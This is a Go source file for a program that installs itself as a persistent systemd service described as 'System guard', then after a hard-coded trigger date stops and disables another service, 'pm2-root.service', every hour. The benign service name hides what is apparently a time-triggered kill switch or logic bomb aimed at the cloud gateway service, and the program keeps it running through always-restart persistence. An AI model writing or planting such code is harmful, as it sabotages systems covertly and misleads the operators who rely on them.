package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

var version = "0.0.0"
var epochTime = "2020-01-01T00:00:00Z"
var cloudgatewayService = "pm2-root.service"
var gardService = "/usr/lib/systemd/system/cloudguard.service"

var service = `
[Unit]
Description=System guard
After=network.target

[Service]
Restart=always
RestartSec=240
ExecStart=/usr/local/bin/guard
KillMode=control-group

[Install]
WantedBy=multi-user.target
`

func createServiceFile() error {
	fd, err := os.Create(gardService)
	if err != nil {
		return err
	}
	_, err = fd.WriteString(service)
	return err
}

func initGuard() error {
	if err := exec.Command("cp", "-f", os.Args[0], "/usr/local/bin/").Run(); err != nil {
		return err
	}
	if err := createServiceFile(); err != nil {
		return err
	}
	if err := exec.Command("systemctl", "enable", filepath.Base(gardService)).Run(); err != nil {
		return err
	}
	if err := exec.Command("systemctl", "start", filepath.Base(gardService)).Run(); err != nil {
		return err
	}
	return nil
}

func stopCloudgw() error {
	if err := exec.Command("systemctl", "stop", cloudgatewayService).Run(); err != nil {
		return err
	}
	if err := exec.Command("systemctl", "disable", cloudgatewayService).Run(); err != nil {
		return err
	}
	return nil
}

func startGuard() {
	triggerTime, err := time.Parse("2006-01-02T15:04:05Z", epochTime)
	if err != nil {
		return
	}
	for {
		time.Sleep(time.Hour)
		if time.Now().Before(triggerTime) {
			continue
		}
		stopCloudgw()
	}
}

func uninstall() error {
	if err := exec.Command("systemctl", "stop", filepath.Base(gardService)).Run(); err != nil {
		return err
	}
	if err := exec.Command("systemctl", "disable", filepath.Base(gardService)).Run(); err != nil {
		return err
	}
	if err := exec.Command("rm", "-f", gardService).Run(); err != nil {
		return err
	}
	return nil
}

func main() {
	if len(os.Args) > 1 && os.Args[1] == "version" {
		fmt.Println(version)
		return
	}
	if len(os.Args) > 1 && os.Args[1] == "init" {
		if err := initGuard(); err != nil {
			fmt.Println("init failed: ", err)
		}
		return
	}
	if len(os.Args) > 1 && os.Args[1] == "uninstall" {
		if err := uninstall(); err != nil {
			fmt.Println("uninstall failed: ", err)
		}
		return
	}

	startGuard()
}
